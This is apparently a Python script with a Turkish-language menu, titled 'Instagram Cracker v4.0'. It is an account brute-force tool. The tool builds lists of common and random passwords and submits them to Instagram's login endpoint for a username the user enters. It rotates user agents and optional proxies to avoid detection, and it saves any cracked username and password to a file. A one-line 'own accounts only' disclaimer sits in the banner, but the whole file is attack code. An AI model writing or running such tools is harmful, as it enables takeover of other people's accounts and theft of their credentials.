#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import time
import random
import requests
import json
from datetime import datetime
from colorama import Fore, Back, Style, init
from fake_useragent import UserAgent
import threading

init(autoreset=True)

# --- CONFIG ---
CONFIG = {
    "use_proxy": False,
    "proxy_list": [],
    "request_delay": 3,
    "max_attempts": 500,
    "vip_mode": False,
    "save_session": True,
    "auto_save": True
}

# --- BANNER ---
def show_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(Fore.RED + """
  _____           _                    _____               _               
 |_   _|         | |                  / ____|             | |              
   | |  _ __  ___| |_ __ _ _ __ ______| | _ _ __ __ _  ___| |__   ___ _ __ 
   | | | '_ \/ __| __/ _` | '__|______| || '__/ _` |/ __| '_ \ / _ \ '__|
  _| |_| | | \__ \ || (_| | |        | |__| | | (_| | (__| | | |  __/ |   
 |_____|_| |_|___/\__\__,_|_|         \_____|_|  \__,_|\___|_| |_|\___|_|  
    """ + Fore.YELLOW + "v4.0 - " + Fore.CYAN + "Termux Edition\n")
    print(Fore.WHITE + "[" + Fore.RED + "!" + Fore.WHITE + "] " + Fore.YELLOW + "YASAL UYARI: Sadece kendi hesaplarınızda test yapın!\n")

# --- PROXY YÖNETİMİ ---
def load_proxies():
    if os.path.exists("proxy.txt"):
        with open("proxy.txt", "r") as f:
            CONFIG["proxy_list"] = [line.strip() for line in f if line.strip()]
    else:
        print(Fore.YELLOW + "[!] proxy.txt bulunamadı. Proxy kullanılmayacak.")

def get_random_proxy():
    if CONFIG["use_proxy"] and CONFIG["proxy_list"]:
        return random.choice(CONFIG["proxy_list"])
    return None

# --- ŞİFRE ÜRETİCİ ---
def generate_passwords(username=""):
    common = [
        "password", "123456", username+"123", "instagram", "qwerty",
        "123456789", "12345678", "111111", "123123", "1234567",
        "password1", "12345", "1234567890", "admin", "iloveyou"
    ]
    
    # VIP modda daha fazla şifre
    if CONFIG["vip_mode"]:
        common.extend([
            "bjk1903", "fb1907", "gs1905", "password123", "123qwe",
            "1q2w3e4r", "qwerty123", "zaq12wsx", "!@#$%^&*", "asdfghjkl"
        ])
    
    # Rastgele şifreler
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*"
    for _ in range(100 if CONFIG["vip_mode"] else 50):
        length = random.randint(6, 12)
        pwd = ''.join(random.choice(chars) for _ in range(length))
        common.append(pwd)
    
    random.shuffle(common)
    return common[:CONFIG["max_attempts"]]

# --- INSTAGRAM API ---
class InstagramBrute:
    def __init__(self):
        self.session = requests.Session()
        self.ua = UserAgent()
        self.headers = {
            "User-Agent": self.ua.random,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/accounts/login/",
        }
    
    def login(self, username, password):
        try:
            # Önce CSRF token al
            proxy = get_random_proxy()
            proxies = {"http": proxy, "https": proxy} if proxy else None
            
            # Giriş isteği
            login_url = "https://www.instagram.com/accounts/login/ajax/"
            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{int(datetime.now().timestamp())}:{password}"
            
            data = {
                "username": username,
                "enc_password": enc_password,
                "queryParams": {},
                "optIntoOneTap": "false"
            }
            
            response = self.session.post(login_url, data=data, headers=self.headers, proxies=proxies)
            
            if response.status_code == 200:
                result = response.json()
                if result.get("authenticated"):
                    return True
                elif result.get("message") == "checkpoint_required":
                    return "checkpoint"
            return False
        except:
            return False

# --- BRUTEFORCE ---
def start_attack(username):
    brute = InstagramBrute()
    passwords = generate_passwords(username)
    
    print(Fore.GREEN + f"\n[+] {username} için {len(passwords)} şifre denenecek...")
    print(Fore.YELLOW + "[!] Başlatılıyor...\n")
    
    for idx, password in enumerate(passwords, 1):
        try:
            print(Fore.WHITE + f"[{idx}] Denenen: {Fore.CYAN}{password}", end=" ")
            
            result = brute.login(username, password)
            
            if result is True:
                print(Fore.GREEN + "=> BAŞARILI!")
                print(Fore.GREEN + f"\n[+] Şifre bulundu: {password}")
                if CONFIG["save_session"]:
                    save_result(username, password)
                return
            elif result == "checkpoint":
                print(Fore.YELLOW + "=> CHECKPOINT")
            else:
                print(Fore.RED + "=> BAŞARISIZ")
            
            # Hız sınırlama
            delay = CONFIG["request_delay"] / 2 if CONFIG["vip_mode"] else CONFIG["request_delay"]
            time.sleep(delay)
            
            # Her 5 denemede proxy/user-agent değiştir
            if idx % 5 == 0:
                brute.headers["User-Agent"] = brute.ua.random
        except:
            print(Fore.RED + "=> HATA")
    
    print(Fore.RED + "\n[-] Şifre bulunamadı!")

def save_result(username, password):
    with open("results.txt", "a") as f:
        f.write(f"{username}:{password}\n")
    print(Fore.GREEN + "[+] Sonuçlar results.txt'ye kaydedildi.")

# --- MENÜ ---
def main_menu():
    show_banner()
    print(Fore.WHITE + "[" + Fore.GREEN + "1" + Fore.WHITE + "] Bruteforce Başlat")
    print(Fore.WHITE + "[" + Fore.GREEN + "2" + Fore.WHITE + "] Şifre Listesi Oluştur")
    print(Fore.WHITE + "[" + Fore.GREEN + "3" + Fore.WHITE + "] Proxy Ayarları")
    print(Fore.WHITE + "[" + Fore.GREEN + "4" + Fore.WHITE + "] VIP Mod: " + 
          (Fore.GREEN + "AÇIK" if CONFIG["vip_mode"] else Fore.RED + "KAPALI"))
    print(Fore.WHITE + "[" + Fore.GREEN + "5" + Fore.WHITE + "] Çıkış")
    
    choice = input(Fore.WHITE + "\n[?] Seçiminiz: " + Fore.GREEN)
    return choice

# --- MAIN ---
if __name__ == "__main__":
    try:
        load_proxies()
        while True:
            choice = main_menu()
            
            if choice == "1":
                username = input(Fore.WHITE + "[?] Kullanıcı adı: " + Fore.CYAN)
                start_attack(username)
                input(Fore.WHITE + "\n[Devam etmek için Enter'a basın...")
            elif choice == "2":
                username = input(Fore.WHITE + "[?] Özelleştirmek için kullanıcı adı (boş bırakabilirsiniz): " + Fore.CYAN)
                passwords = generate_passwords(username)
                with open("passwords.txt", "w") as f:
                    f.write("\n".join(passwords))
                print(Fore.GREEN + f"[+] {len(passwords)} şifre passwords.txt'ye kaydedildi!")
                time.sleep(2)
            elif choice == "3":
                CONFIG["use_proxy"] = not CONFIG["use_proxy"]
                status = Fore.GREEN + "AÇIK" if CONFIG["use_proxy"] else Fore.RED + "KAPALI"
                print(Fore.YELLOW + f"[!] Proxy kullanımı: {status}")
                time.sleep(1)
            elif choice == "4":
                CONFIG["vip_mode"] = not CONFIG["vip_mode"]
                status = Fore.GREEN + "AÇIK" if CONFIG["vip_mode"] else Fore.RED + "KAPALI"
                print(Fore.YELLOW + f"[!] VIP Mod: {status}")
                time.sleep(1)
            elif choice == "5":
                print(Fore.YELLOW + "\n[+] Çıkış yapılıyor...")
                sys.exit(0)
            else:
                print(Fore.RED + "\n[-] Geçersiz seçim!")
                time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[-] Program kapatıldı!")
        sys.exit(0)
